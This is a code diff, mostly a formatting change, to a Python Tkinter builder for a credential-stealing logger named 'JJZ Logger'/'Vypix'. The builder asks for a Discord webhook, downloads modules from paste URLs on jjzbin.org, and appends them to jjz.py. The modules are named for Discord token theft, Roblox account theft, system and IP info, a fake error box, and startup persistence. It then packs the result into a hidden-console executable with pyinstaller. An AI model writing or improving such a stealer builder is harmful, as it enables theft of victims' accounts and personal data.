@@ -47,142 +47,188 @@ class main(tk.Tk):
 
 
     def compile1(self):
-       ctypes.windll.user32.MessageBoxW(None, f'Compiling exe (this may take a little bit)', 'Success', 0)
-       os.system("pyinstaller jjz.py --name VypixBuilt --distpath build --onefile --noconsole")
-       ctypes.windll.user32.MessageBoxW(None, f'JJZ Logger has been built in build/VypixBuilt', 'Success', 0)
-       os.remove("VypixBuilt.spec")
-       os.remove("jjz.py")
+        ctypes.windll.user32.MessageBoxW(
+            None, 'Compiling exe (this may take a little bit)', 'Success', 0
+        )
+        os.system("pyinstaller jjz.py --name VypixBuilt --distpath build --onefile --noconsole")
+        ctypes.windll.user32.MessageBoxW(
+            None, 'JJZ Logger has been built in build/VypixBuilt', 'Success', 0
+        )
+        os.remove("VypixBuilt.spec")
+        os.remove("jjz.py")
        
 
 
     def inputlol(self):
-       webhook = self.input.get()
-       if not webhook:
-           ctypes.windll.user32.MessageBoxW(None, 'Please enter webhook first', 'Error', 0)
-           return
+        webhook = self.input.get()
+        if not webhook:
+            ctypes.windll.user32.MessageBoxW(None, 'Please enter webhook first', 'Error', 0)
+            return
 
-       paste_url = 'https://jjzbin.org/raw/dawivi'
-       response = requests.get(paste_url)
+        paste_url = 'https://jjzbin.org/raw/dawivi'
+        response = requests.get(paste_url)
 
-       if response.status_code == 200:
+        if response.status_code == 200:
             content = response.text
             with open('jjz.py', 'a', encoding='utf-8') as f:
                     f.write('\n' + content)
-       else:
-        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.', 'Success', 0)
-            
-       ctypes.windll.user32.MessageBoxW(None, f'Webhook set as {webhook}', 'Success', 0)
+        else:
+            ctypes.windll.user32.MessageBoxW(
+                None,
+                'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.',
+                'Success',
+                0,
+            )
+
+        ctypes.windll.user32.MessageBoxW(None, f'Webhook set as {webhook}', 'Success', 0)
 
     def discord(self, webhook=None):
-       webhook = self.input.get()
-       if not webhook:
-           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
-           return
-    
-       paste = 'https://jjzbin.org/raw/babawe'
-       response = requests.get(paste)
+        webhook = self.input.get()
+        if not webhook:
+            ctypes.windll.user32.MessageBoxW(None, 'Set a Webhook first', 'Success', 0)
+            return
 
-       if response.status_code == 200:
+        paste = 'https://jjzbin.org/raw/babawe'
+        response = requests.get(paste)
+
+        if response.status_code == 200:
             content = response.text
             with open('jjz.py', 'a', encoding='utf-8') as f:
                     f.write('\n' + content)
-       else:
-        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.', 'Success', 0)
-            
-       ctypes.windll.user32.MessageBoxW(None, f'Discord Stealing Enabled (This is just injection btw)', 'Success', 0)
+        else:
+            ctypes.windll.user32.MessageBoxW(
+                None,
+                'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.',
+                'Success',
+                0,
+            )
+
+        ctypes.windll.user32.MessageBoxW(
+            None,
+            'Discord Stealing Enabled (This is just injection btw)',
+            'Success',
+            0,
+        )
 
 
     def roblox(self, webhook=None):
-       webhook = self.input.get()
-       if not webhook:
-           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
-           return
-    
-       paste = 'https://jjzbin.org/raw/uvulol'
-       response = requests.get(paste)
+        webhook = self.input.get()
+        if not webhook:
+            ctypes.windll.user32.MessageBoxW(None, 'Set a Webhook first', 'Success', 0)
+            return
 
-       if response.status_code == 200:
+        paste = 'https://jjzbin.org/raw/uvulol'
+        response = requests.get(paste)
+
+        if response.status_code == 200:
             content = response.text
             with open('jjz.py', 'a', encoding='utf-8') as f:
                     f.write('\n' + content)
-       else:
-        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.', 'Success', 0)
-            
-       ctypes.windll.user32.MessageBoxW(None, f'Roblox Stealing enabled', 'Success', 0)
+        else:
+            ctypes.windll.user32.MessageBoxW(
+                None,
+                'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.',
+                'Success',
+                0,
+            )
+
+        ctypes.windll.user32.MessageBoxW(None, 'Roblox Stealing enabled', 'Success', 0)
 
     def sysinfo(self, webhook=None):
-       webhook = self.input.get()
-       if not webhook:
-           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
-           return
-    
-       paste = 'https://jjzbin.org/raw/raqubo'
-       response = requests.get(paste)
+        webhook = self.input.get()
+        if not webhook:
+            ctypes.windll.user32.MessageBoxW(None, 'Set a Webhook first', 'Success', 0)
+            return
 
-       if response.status_code == 200:
+        paste = 'https://jjzbin.org/raw/raqubo'
+        response = requests.get(paste)
+
+        if response.status_code == 200:
             content = response.text
             with open('jjz.py', 'a', encoding='utf-8') as f:
                     f.write('\n' + content)
-       else:
-        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.', 'Success', 0)
-            
-       ctypes.windll.user32.MessageBoxW(None, f'Sys Info enabled', 'Success', 0)
+        else:
+            ctypes.windll.user32.MessageBoxW(
+                None,
+                'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.',
+                'Success',
+                0,
+            )
+
+        ctypes.windll.user32.MessageBoxW(None, 'Sys Info enabled', 'Success', 0)
 
 
     def ipinfo(self, webhook=None):
-       webhook = self.input.get()
-       if not webhook:
-           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
-           return
-       paste = 'https://jjzbin.org/raw/axayub'
-       response = requests.get(paste)
+        webhook = self.input.get()
+        if not webhook:
+            ctypes.windll.user32.MessageBoxW(None, 'Set a Webhook first', 'Success', 0)
+            return
+        paste = 'https://jjzbin.org/raw/axayub'
+        response = requests.get(paste)
 
-       if response.status_code == 200:
+        if response.status_code == 200:
             content = response.text
             with open('jjz.py', 'a', encoding='utf-8') as f:
                     f.write('\n' + content)
-       else:
-        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.', 'Success', 0)
-        	
-       ctypes.windll.user32.MessageBoxW(None, f'IP info enabled', 'Success', 0)
+        else:
+            ctypes.windll.user32.MessageBoxW(
+                None,
+                'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.',
+                'Success',
+                0,
+            )
+
+        ctypes.windll.user32.MessageBoxW(None, 'IP info enabled', 'Success', 0)
     
     def errorbox(self, webhook=None):
-       webhook = self.input.get()
-       if not webhook:
-           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
-           return
-    
-       paste = 'https://jjzbin.org/raw/lujeso'
-       response = requests.get(paste)
+        webhook = self.input.get()
+        if not webhook:
+            ctypes.windll.user32.MessageBoxW(None, 'Set a Webhook first', 'Success', 0)
+            return
 
-       if response.status_code == 200:
+        paste = 'https://jjzbin.org/raw/lujeso'
+        response = requests.get(paste)
+
+        if response.status_code == 200:
             content = response.text
             with open('jjz.py', 'a', encoding='utf-8') as f:
                     f.write('\n' + content)
-            ctypes.windll.user32.MessageBoxW(None, f'Error box enabled', 'Success', 0)
-       else:
-        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.', 'Success', 0)
+            ctypes.windll.user32.MessageBoxW(None, 'Error box enabled', 'Success', 0)
+        else:
+            ctypes.windll.user32.MessageBoxW(
+                None,
+                'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.',
+                'Success',
+                0,
+            )
 
             
 
 
     def startup(self, webhook=None):
-       webhook = self.input.get()
-       if not webhook:
-           ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
-           return
-    
-       paste = 'https://jjzbin.org/raw/enamay'
-       response = requests.get(paste)
+        webhook = self.input.get()
+        if not webhook:
+            ctypes.windll.user32.MessageBoxW(None, 'Set a Webhook first', 'Success', 0)
+            return
 
-       if response.status_code == 200:
+        paste = 'https://jjzbin.org/raw/enamay'
+        response = requests.get(paste)
+
+        if response.status_code == 200:
             content = response.text
             with open('jjz.py', 'a', encoding='utf-8') as f:
                     f.write('\n' + content)
-       else:
-        	ctypes.windll.user32.MessageBoxW(None, f'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.', 'Success', 0)
-            
-       ctypes.windll.user32.MessageBoxW(None, f'Startup successfully enabled.', 'Success', 0)
+        else:
+            ctypes.windll.user32.MessageBoxW(
+                None,
+                'You need a working internet connection to build free version of Vypix.. Purchase "Plus" to build offline.',
+                'Success',
+                0,
+            )
+
+        ctypes.windll.user32.MessageBoxW(
+            None, 'Startup successfully enabled.', 'Success', 0
+        )
 
 
 if __name__ == '__main__':
